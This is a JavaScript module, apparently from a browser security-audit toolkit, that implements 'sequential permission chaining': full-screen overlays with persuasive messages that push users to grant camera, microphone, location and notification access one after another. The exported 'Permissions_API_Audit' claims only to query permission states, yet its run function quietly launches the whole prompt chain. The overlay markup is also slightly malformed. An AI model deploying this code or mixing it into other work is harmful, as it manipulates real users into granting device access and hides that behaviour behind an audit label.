/**
 * permission_abuse.js — Sequential Permission Chaining (Live Demonstration, Sandboxed)
 *
 * Real attack: chains multiple permission prompts (camera, mic, geolocation, notifications)
 * with social‑engineering overlays to trick the user into granting access.
 *
 * All captured permission outcomes are logged to the browser console and stored in
 * memory only. No data is ever transmitted to any external server.
 *
 * Default export: Pinpoint `Permissions_API_Audit` (API state check).
 */

// ---------------------------------------------------------------------------
// 1. Permission Chaining Engine (Real attack, local only)
// ---------------------------------------------------------------------------

const PERMISSION_DEFS = {
    camera: {
        name: 'camera',
        permissionApiName: 'camera',
        async requestFn() {
            if (!navigator.mediaDevices?.getUserMedia) return 'denied';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                stream.getTracks().forEach(track => track.stop());
                return 'granted';
            } catch (e) {
                return 'denied';
            }
        },
    },
    microphone: {
        name: 'microphone',
        permissionApiName: 'microphone',
        async requestFn() {
            if (!navigator.mediaDevices?.getUserMedia) return 'denied';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                stream.getTracks().forEach(track => track.stop());
                return 'granted';
            } catch (e) {
                return 'denied';
            }
        },
    },
    geolocation: {
        name: 'geolocation',
        permissionApiName: 'geolocation',
        requestFn() {
            return new Promise(resolve => {
                if (!navigator.geolocation) { resolve('denied'); return; }
                navigator.geolocation.getCurrentPosition(
                    () => resolve('granted'),
                    (err) => {
                        if (err.code === err.PERMISSION_DENIED || err.code === err.POSITION_UNAVAILABLE) {
                            resolve('denied');
                        } else {
                            resolve('denied');
                        }
                    },
                    { timeout: 5000, maximumAge: 60000 }
                );
            });
        },
    },
    notifications: {
        name: 'notifications',
        permissionApiName: 'notifications',
        async requestFn() {
            if (!('Notification' in window)) return 'denied';
            if (Notification.permission === 'granted') return 'granted';
            if (Notification.permission === 'denied') return 'denied';
            const result = await Notification.requestPermission();
            return result;
        },
    },
};

function showPermissionOverlay(opts) {
    const { message, permissionName = 'permission', timeout = 0 } = opts;
    return new Promise((resolve) => {
        const overlay = document.createElement('div');
        overlay.id = '__perm_chain_overlay';
        Object.assign(overlay.style, {
            position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh',
            backgroundColor: 'rgba(0,0,0,0.6)', backdropFilter: 'blur(4px)',
            zIndex: '2147483647', display: 'flex', alignItems: 'center', justifyContent: 'center',
            fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif',
        });

        overlay.innerHTML = `
      <div style="
        background: white; border-radius: 8px; box-shadow: 0 2px 15px rgba(0,0,0,0.2);
        <div style="font-size: 18px; font-weight: bold; margin-bottom: 16px; color: #1a73e8;">
          ${permissionName === 'camera' ? '[CAMERA]' : permissionName === 'microphone' ? '[MIC]' : permissionName === 'geolocation' ? '[LOCATION]' : '[NOTIF]'}
        </div>
        <p style="font-size: 16px; color: #202124; margin-bottom: 24px; line-height: 1.5;">
          ${message}
        </p>
        <button id="__perm_overlay_ok" style="
          background: #1a73e8; color: white; border: none; padding: 10px 24px;
          border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer;">
          OK
        </button>
      </div>
    `;

        document.body.appendChild(overlay);

        const okBtn = document.getElementById('__perm_overlay_ok');
        const removeOverlay = () => {
            if (overlay.parentNode) overlay.remove();
            resolve();
        };
        okBtn.addEventListener('click', removeOverlay);

        if (timeout > 0) {
            setTimeout(() => {
                if (overlay.parentNode) removeOverlay();
            }, timeout);
        }
    });
}

/**
 * Chains multiple permission requests with social‑engineering overlays.
 * All results are kept locally; no data leaves the browser.
 */
export async function chainPermissionRequests(options = {}) {
    const {
        permissions = ['camera', 'microphone', 'geolocation', 'notifications'],
        messages = {},
        showOverlay = true,
        delayBetween = 1500,
        onProgress = null,
        overlayTimeout = 8000,
    } = options;

    const results = {};

    for (const perm of permissions) {
        const def = PERMISSION_DEFS[perm];
        if (!def) {
            results[perm] = 'unsupported';
            if (onProgress) onProgress(perm, 'unsupported');
            continue;
        }

        if (showOverlay) {
            const defaultMessage = {
                camera: 'To continue, please allow camera access when your browser asks.',
                microphone: 'Next, allow microphone access to continue using this feature.',
                geolocation: 'We need your location to provide accurate results. Please allow.',
                notifications: 'Finally, allow notifications so we can send you important updates.',
            };
            const msg = messages[perm] || defaultMessage[perm] || `Please allow "${perm}" access.`;
            await showPermissionOverlay({
                message: msg,
                permissionName: perm,
                timeout: overlayTimeout,
            });
            await new Promise(r => setTimeout(r, 300));
        }

        try {
            const status = await def.requestFn();
            results[perm] = status;
            if (onProgress) onProgress(perm, status);
            console.log(`[permission_abuse] ${perm} status: ${status}`);
        } catch (e) {
            results[perm] = 'error';
            if (onProgress) onProgress(perm, 'error');
            console.warn(`[permission_abuse] ${perm} error:`, e);
        }

        await new Promise(r => setTimeout(r, delayBetween));
    }

    console.log('[permission_abuse] Chain complete. Local results:', results);
    return results;
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'permission_abuse',
    title: 'Permissions_API_Audit',
    level: 6,
    info: 'Audits navigator.permissions.query state for geolocation, notifications, and camera sensors.',
    steps: [
        'Check navigator.permissions.',
        'Query permission status for geolocation and notifications.',
    ],
    run: async () => {
        // Trigger live demonstration
        chainPermissionRequests().catch(() => {});

        if (!navigator.permissions || !navigator.permissions.query) {
            return {
                supported: false,
                message: 'Permissions API is not supported by this browser.',
            };
        }

        const results = {};
        const targets = ['geolocation', 'notifications', 'camera', 'microphone'];

        await Promise.all(targets.map(async (name) => {
            try {
                const status = await navigator.permissions.query({ name });
                results[name] = status.state;
            } catch (e) {
                results[name] = 'not_queriable';
            }
        }));

        return {
            supported: true,
            permissionsState: results,
        };
    },
};

export default pinpointModule;